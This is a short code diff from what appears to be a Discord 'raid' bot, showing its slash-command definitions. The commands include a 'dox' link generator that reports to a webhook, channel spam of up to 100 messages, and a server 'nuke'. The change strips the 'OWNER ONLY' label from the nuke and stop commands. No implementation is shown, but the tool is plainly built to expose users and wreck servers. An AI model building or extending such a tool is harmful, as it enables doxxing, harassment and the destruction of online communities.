@@ -41,8 +41,8 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: '[OWNER ONLY] Nuke a server', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms (default 50)', required: false }] },
-        { name: 'stop', description: '[OWNER ONLY] Stop your nuke' },
+        { name: 'nuke', description: 'Nuke a server', options: [{ name: 'channels', type: 4, description: 'Channels (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms (default 50)', required: false }] },
+        { name: 'stop', description: 'Stop your nuke' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
